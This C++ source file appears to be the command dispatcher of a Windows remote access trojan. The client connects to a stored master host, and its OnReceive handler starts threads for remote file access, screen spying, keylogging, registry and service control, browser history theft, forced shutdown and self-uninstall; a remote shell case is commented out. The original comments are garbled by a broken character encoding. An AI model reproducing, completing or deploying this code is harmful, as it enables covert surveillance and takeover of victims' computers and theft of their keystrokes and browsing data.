// KernelManager.cpp: implementation of the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "KernelManager.h"
#include "Loop.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char	CKernelManager::m_strMasterHost[256] = { 0 };
UINT	CKernelManager::m_nMasterPort = 80;

CKernelManager::CKernelManager(CClientSocket *pClient,
                               LPCSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
{
    if (lpszMasterHost != NULL)
        strcpy(m_strMasterHost, lpszMasterHost);

    m_nMasterPort = nMasterPort;
    m_nThreadCount = 0;
}

CKernelManager::~CKernelManager()
{
    for (UINT i = 0; i < m_nThreadCount; i++) {
        TerminateThread(m_hThread[i], -1);
        CloseHandle(m_hThread[i]);
    }
}

void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{

    switch (lpBuffer[0]) {
    case COMMAND_LIST_DRIVE: // �ļ�����
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager,
                                      (LPVOID)m_pClient->m_Socket, 0, NULL, false);
        break;
    case COMMAND_SCREEN_SPY: // ��Ļ�鿴
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
                                      (LPVOID)m_pClient->m_Socket, 0, NULL, true);
        break;
    case COMMAND_SYSTEM://ϵͳ����
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
                                      (LPVOID)m_pClient->m_Socket, 0, NULL);
        break;
    case COMMAND_KEYBOARD: //���̼�¼
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
                                      (LPVOID)m_pClient->m_Socket, 0, NULL);
        break;
// 	case COMMAND_SHELL: // Զ���ն�
// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager,
// 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
// 		break;
    case COMMAND_SERVICE_MANAGER://�������
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ServiceManager,
                                      (LPVOID)m_pClient->m_Socket, 0, NULL);
        break;
    case COMMAND_REGEDIT://ע������
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_RegeditManager,
                                      (LPVOID)m_pClient->m_Socket, 0, NULL);
        break;
    case COMMAND_URL_HISTORY://�����¼
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_UrlManager,
                                      (LPVOID)m_pClient->m_Socket, 0, NULL);
        break;
    case COMMAND_MESSAGEBOX://����
        m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_Messagebox,
                                      (LPVOID)(lpBuffer + 1), 0, NULL, true);
        break;
    case COMMAND_CHANGE_GROUP://���ķ���
        SetHostID((LPCTSTR)(lpBuffer + 1), TRUE);
        break;
    case COMMAND_RENAME_REMARK://���ı�ע
        SetHostID((LPCTSTR)(lpBuffer + 1), FALSE);
        break;
    case COMMAND_SESSION://�Ự����
        ShutdownWindows(lpBuffer[1]);
        break;
    case COMMAND_UNINSTALL://ж������
        UninstallService();
        break;
    default:
        break;
    }
}


